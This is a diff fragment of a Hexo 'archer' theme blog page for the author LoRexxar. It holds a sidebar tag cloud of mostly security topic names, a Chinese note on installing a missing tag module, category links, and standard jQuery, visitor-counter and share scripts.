+        <span class="sidebar-tag-name" data-tags="c"><span class="iconfont-archer">&#xe606;</span>c</span>
+    
+        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reprint"><span class="iconfont-archer">&#xe606;</span>Reprint</span>
+    
+        <span class="sidebar-tag-name" data-tags="bookshelf"><span class="iconfont-archer">&#xe606;</span>bookshelf</span>
+    
+        <span class="sidebar-tag-name" data-tags="chrome_ext"><span class="iconfont-archer">&#xe606;</span>chrome_ext</span>
+    
+        <span class="sidebar-tag-name" data-tags="chrome"><span class="iconfont-archer">&#xe606;</span>chrome</span>
+    
+        <span class="sidebar-tag-name" data-tags="dns"><span class="iconfont-archer">&#xe606;</span>dns</span>
+    
+        <span class="sidebar-tag-name" data-tags="cloudeye"><span class="iconfont-archer">&#xe606;</span>cloudeye</span>
+    
+        <span class="sidebar-tag-name" data-tags="cmd"><span class="iconfont-archer">&#xe606;</span>cmd</span>
+    
+        <span class="sidebar-tag-name" data-tags="shell"><span class="iconfont-archer">&#xe606;</span>shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="node"><span class="iconfont-archer">&#xe606;</span>node</span>
+    
+        <span class="sidebar-tag-name" data-tags="contract"><span class="iconfont-archer">&#xe606;</span>contract</span>
+    
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
+    
+        <span class="sidebar-tag-name" data-tags="rabins"><span class="iconfont-archer">&#xe606;</span>rabins</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="phpmailer"><span class="iconfont-archer">&#xe606;</span>phpmailer</span>
+    
+        <span class="sidebar-tag-name" data-tags="dedecms"><span class="iconfont-archer">&#xe606;</span>dedecms</span>
+    
+        <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="book_notes"><span class="iconfont-archer">&#xe606;</span>book_notes</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约"><span class="iconfont-archer">&#xe606;</span>智能合约</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="phar"><span class="iconfont-archer">&#xe606;</span>phar</span>
+    
+        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
+    
+        <span class="sidebar-tag-name" data-tags="dvp"><span class="iconfont-archer">&#xe606;</span>dvp</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf web"><span class="iconfont-archer">&#xe606;</span>ctf web</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="dz"><span class="iconfont-archer">&#xe606;</span>dz</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化漏洞"><span class="iconfont-archer">&#xe606;</span>反序列化漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="类型混淆漏洞"><span class="iconfont-archer">&#xe606;</span>类型混淆漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="ecshop"><span class="iconfont-archer">&#xe606;</span>ecshop</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
+        <span class="sidebar-tag-name" data-tags="access"><span class="iconfont-archer">&#xe606;</span>access</span>
+    
+        <span class="sidebar-tag-name" data-tags="伪协议"><span class="iconfont-archer">&#xe606;</span>伪协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="eth"><span class="iconfont-archer">&#xe606;</span>eth</span>
+    
+        <span class="sidebar-tag-name" data-tags="Fomo3D"><span class="iconfont-archer">&#xe606;</span>Fomo3D</span>
+    
+        <span class="sidebar-tag-name" data-tags="Essay"><span class="iconfont-archer">&#xe606;</span>Essay</span>
+    
+        <span class="sidebar-tag-name" data-tags="checklist"><span class="iconfont-archer">&#xe606;</span>checklist</span>
+    
+        <span class="sidebar-tag-name" data-tags="hctf"><span class="iconfont-archer">&#xe606;</span>hctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="php opcache"><span class="iconfont-archer">&#xe606;</span>php opcache</span>
+    
+        <span class="sidebar-tag-name" data-tags="eassy"><span class="iconfont-archer">&#xe606;</span>eassy</span>
+    
+        <span class="sidebar-tag-name" data-tags="jsre"><span class="iconfont-archer">&#xe606;</span>jsre</span>
+    
+        <span class="sidebar-tag-name" data-tags="clrf"><span class="iconfont-archer">&#xe606;</span>clrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="struts2"><span class="iconfont-archer">&#xe606;</span>struts2</span>
+    
+        <span class="sidebar-tag-name" data-tags="injection"><span class="iconfont-archer">&#xe606;</span>injection</span>
+    
+        <span class="sidebar-tag-name" data-tags="mimic"><span class="iconfont-archer">&#xe606;</span>mimic</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwnhub"><span class="iconfont-archer">&#xe606;</span>pwnhub</span>
+    
+        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
+    
+        <span class="sidebar-tag-name" data-tags="格式化字符串"><span class="iconfont-archer">&#xe606;</span>格式化字符串</span>
+    
+        <span class="sidebar-tag-name" data-tags="模板注入"><span class="iconfont-archer">&#xe606;</span>模板注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="wget"><span class="iconfont-archer">&#xe606;</span>wget</span>
+    
+        <span class="sidebar-tag-name" data-tags="js"><span class="iconfont-archer">&#xe606;</span>js</span>
+    
+        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="lfi"><span class="iconfont-archer">&#xe606;</span>lfi</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="win server信息收集"><span class="iconfont-archer">&#xe606;</span>win server信息收集</span>
+    
+        <span class="sidebar-tag-name" data-tags="msf"><span class="iconfont-archer">&#xe606;</span>msf</span>
+    
+        <span class="sidebar-tag-name" data-tags="lcx端口转发"><span class="iconfont-archer">&#xe606;</span>lcx端口转发</span>
+    
+        <span class="sidebar-tag-name" data-tags="IPC通道入侵"><span class="iconfont-archer">&#xe606;</span>IPC通道入侵</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastcgi"><span class="iconfont-archer">&#xe606;</span>fastcgi</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssh_sock5"><span class="iconfont-archer">&#xe606;</span>ssh_sock5</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="tqdm"><span class="iconfont-archer">&#xe606;</span>tqdm</span>
+    
+        <span class="sidebar-tag-name" data-tags="virtualenv"><span class="iconfont-archer">&#xe606;</span>virtualenv</span>
+    
+        <span class="sidebar-tag-name" data-tags="open_basedir"><span class="iconfont-archer">&#xe606;</span>open_basedir</span>
+    
+        <span class="sidebar-tag-name" data-tags="crontab"><span class="iconfont-archer">&#xe606;</span>crontab</span>
+    
+        <span class="sidebar-tag-name" data-tags="roundcube"><span class="iconfont-archer">&#xe606;</span>roundcube</span>
+    
+        <span class="sidebar-tag-name" data-tags="sangebaimao"><span class="iconfont-archer">&#xe606;</span>sangebaimao</span>
+    
+        <span class="sidebar-tag-name" data-tags="参数污染"><span class="iconfont-archer">&#xe606;</span>参数污染</span>
+    
+        <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
+    
+        <span class="sidebar-tag-name" data-tags="LD_PRELOAD"><span class="iconfont-archer">&#xe606;</span>LD_PRELOAD</span>
+    
+        <span class="sidebar-tag-name" data-tags="gopher"><span class="iconfont-archer">&#xe606;</span>gopher</span>
+    
+        <span class="sidebar-tag-name" data-tags="fcgi"><span class="iconfont-archer">&#xe606;</span>fcgi</span>
+    
+        <span class="sidebar-tag-name" data-tags="Essry"><span class="iconfont-archer">&#xe606;</span>Essry</span>
+    
+        <span class="sidebar-tag-name" data-tags="php伪协议"><span class="iconfont-archer">&#xe606;</span>php伪协议</span>
+    
+        <span class="sidebar-tag-name" data-tags="file_put_contents"><span class="iconfont-archer">&#xe606;</span>file_put_contents</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqlmap"><span class="iconfont-archer">&#xe606;</span>sqlmap</span>
+    
+        <span class="sidebar-tag-name" data-tags="game"><span class="iconfont-archer">&#xe606;</span>game</span>
+    
+        <span class="sidebar-tag-name" data-tags="titan_souls"><span class="iconfont-archer">&#xe606;</span>titan_souls</span>
+    
+        <span class="sidebar-tag-name" data-tags="wordpress"><span class="iconfont-archer">&#xe606;</span>wordpress</span>
+    
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="条件竞争"><span class="iconfont-archer">&#xe606;</span>条件竞争</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Blogs"><span class="iconfont-archer">&#xe60a;</span>Blogs</span>
+    
+        <span class="sidebar-category-name" data-categories="Reprint"><span class="iconfont-archer">&#xe60a;</span>Reprint</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "LoRexxar"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
